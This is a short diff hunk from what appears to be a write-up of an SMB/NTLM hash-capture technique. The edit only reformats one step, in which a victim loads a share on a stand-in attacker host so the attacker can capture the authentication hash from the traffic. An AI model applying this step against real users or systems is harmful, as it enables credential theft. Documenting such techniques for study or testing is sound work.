@@ -84,7 +84,7 @@
 ```
 
 2. Generate traffic
-   - Load share \\<attacker ip>\test
+   - Load share: \\attacker ip\test
      
 4. Capture hash from traffic
 ```
